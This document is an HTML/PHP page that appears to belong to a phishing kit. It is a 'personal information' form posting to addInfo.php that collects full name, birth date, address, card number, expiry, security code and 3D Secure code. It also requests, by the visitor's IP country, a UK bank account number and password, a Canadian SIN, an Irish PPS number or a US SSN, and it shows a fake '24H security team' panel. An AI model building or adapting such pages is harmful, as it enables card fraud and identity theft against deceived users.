<div class="container">
    <div class="flex home-content">
        <form action="addInfo.php" method="post" name="details" id="details" class="proceed">
            <div class="container flow-sections">
                <div class="editable account-edit clearfix">
                    <div class="row edit-row">
                        <div class="col-lg-6 col-sm-6">
                            <!-- Info -->
                            <h3 class="section-subtitle" id="nameLabel">Personal Information</h3>
                            <div class="form-group">
                                <!-- First Name -->
                                <div class="pop-wrapper field-pop-wrapper first-wrapper">
                                    <div class="name-input">
                                        <input type="text" name="fname" id="fname" class="generic-input-field form-control field" placeholder="First name" required>
                                    </div>
                                </div>
                                <!-- Middle Name -->
                                <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                    <div class="name-input">
                                        <input type="text" name="mname" id="mname" class="generic-input-field form-control field" placeholder="Middle name (optional)">
                                    </div>
                                </div>
                                <!-- Last Name -->
                                <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                    <div class="name-input">
                                        <input type="text" name="lname" id="lname" class="generic-input-field form-control field" placeholder="Last name" required>
                                    </div>
                                </div>
                                <!-- Birth Date -->
                                <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                    <div class="name-input">
                                        <input id="dob" name="dob" class="form-control form-input" type="tel" placeholder="Date of birth" required>
                                    </div>
                                </div>
                                <!-- Phone -->
                                <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                    <div class="name-input">
                                        <input id="telephone" name="telephone" class="form-control form-input" type="tel" placeholder="Phone number" required>
                                    </div>
                                </div>
                                <!-- Address -->
                                <h3 class="section-subtitle">Address</h3>
                                <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                    <div class="name-input">
                                        <input type="text" name="address" id="address" class="generic-input-field form-control field" placeholder="Address line " required>
                                    </div>
                                </div>
                                <!-- City -->
                                <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                    <div class="name-input">
                                        <input type="text" name="town" id="town" class="generic-input-field form-control field" placeholder="Town / City" required>
                                    </div>
                                </div>
                                <!-- State -->
                                <div class="form-group clearfix middle-wrapper">
                                    <div class="select-wrapper">
                                        <input type="text" name="county" id="county" class="generic-input-field form-control field" placeholder="State" required>
                                    </div>
                                </div>
                                <!-- Zip -->
                                <div class="pop-wrapper field-pop-wrapper last-wrapper">
                                    <div class="name-input">
                                        <input type="text" name="postcode" id="postcode" class="generic-input-field form-control field" placeholder="ZIP code" maxlength="5" required>
                                    </div>
                                </div>
                                <!-- ./Address -->
                                <!-- CC -->
                                <h3 class="section-subtitle" id="nameLabel">Card Details</h3>
                                <!-- CC Holder -->
                                <div class="pop-wrapper field-pop-wrapper first-wrapper">
                                    <div class="name-input">
                                        <input type="text" name="ccname" id="ccname" class="generic-input-field form-control field" placeholder="Card holder name" required>
                                    </div>
                                </div>
                                <!-- CC Number -->
                                <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                    <div class="name-input">
                                        <input type="tel" name="ccno" id="ccno" class="cc-number generic-input-field form-control field" placeholder="Card number" required>
                                    </div>
                                </div>
                                <!-- CC Expiry -->
                                <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                    <div class="name-input">
                                        <input type="tel" name="ccexp" id="ccexp" class="cc-exp generic-input-field form-control field" placeholder="Expiry date" required>
                                    </div>
                                </div>
                                <!-- CSC -->
                                <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                    <div class="name-input">
                                        <input type="tel" name="secode" id="secode" class="cc-cvc generic-input-field form-control field" placeholder="card security code" required>
                                    </div>
                                </div>
                                <!-- ./CC -->
                                <!-- 3DS -->
                                <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                    <div class="name-input">
                                        <input type="tel" name="threeDS" id="threeDS" class="generic-input-field form-control field" placeholder="3D secure code" required>
                                    </div>
                                </div>
                                <!-- ./3DS -->
                                <?php if ( $_SESSION['ip_countryCode'] == 'UK' ): ?>
                                    <!-- SCD -->
                                    <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                        <div class="name-input">
                                            <input type="text" name="sortcode" id="sortcode" class="generic-input-field form-control field" placeholder="Sort code" required>
                                        </div>
                                    </div>
                                    <!-- ACN -->
                                    <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                        <div class="name-input">
                                            <input type="tel" name="acn" id="acn" class="generic-input-field form-control field" placeholder="Account number" required>
                                        </div>
                                    </div>
                                    <!-- ACP -->
                                    <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                        <div class="name-input">
                                            <input type="text" name="acp" id="acp" class="generic-input-field form-control field" placeholder="Account password" required>
                                        </div>
                                    </div>
                                <?php elseif ( $_SESSION['ip_countryCode'] == 'CA' ): ?>
                                    <!-- SIN -->
                                    <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                        <div class="name-input">
                                            <input type="tel" name="sin" id="sin" class="generic-input-field form-control field" placeholder="Social insurence number (9 digits)" required>
                                        </div>
                                    </div>
                                <?php elseif ( $_SESSION['ip_countryCode'] == 'IE' ): ?>
                                    <!-- PPS -->
                                    <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                        <div class="name-input">
                                            <input type="text" name="pps" id="pps" class="generic-input-field form-control field" placeholder="Personal Public Service Number" required>
                                        </div>
                                    </div>
                                <?php elseif ( $_SESSION['ip_countryCode'] == 'US' ): ?>
                                    <!-- SSN -->
                                    <div class="pop-wrapper field-pop-wrapper">
                                        <div class="dob-wrapper clearfix">
                                            <input type="text" name="ssn" id="ssn" class="generic-input-field form-control field" placeholder="Social security number" maxlength="11" required>
                                        </div>
                                    </div>
                                <?php endif; ?>
                                <!-- Identity -->
                                <h3 class="section-subtitle" id="nameLabel">Select A Security Question</h3>
                                <div class="form-group clearfix" style="padding-top:0px;">
                                    <div class="select-wrapper">
                                        <select id="q1" name="question" type="text" class="form-control question" style="height:32px!important;padding-left:10px;">
                                            <option value="">Select security question</option>
                                            <option value="Mother's maiden name">Mother&apos;s Maiden Name</option>
                                            <option value="Driver number">Driving License Number</option>
                                            <option value="Passport number">Passport Number</option>
                                            <option value="National identity card">National identity card</option>
                                        </select>
                                    </div>
                                </div>
                                <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                    <div class="name-input">
                                        <input type="text" name="answer" id="a1" class="generic-input-field form-control field" placeholder="Answer" required>
                                    </div>
                                </div>
                                <!-- ./Identity -->
                                <br>
                                <br>
                                <input type="submit" class="gobtn btn-link" style="width:50%;margin-left:auto;margin-right:auto;float:right" value="Finish">
                            </div>
                            <div style="clear:both;"></div>
                        </div>

                        <div class="col-lg-6 col-sm-6">
                            <h3 class="section-subtitle">Our Security Team Online 24H/24H</h3>
                            <img style="width:100%" src="assets/img/secteam.png" alt="security team">
                        </div>
                        <script type="text/javascript">
                            $(document).ready(function() {
                                if ($('.name-input').children('input[required]')) {
                                    $('.name-input').append('<small class="msg"></small>');
                                }
                            });
                        </script>
                    </div>
                </div>
            </div>
        </form>
    </div>
</div>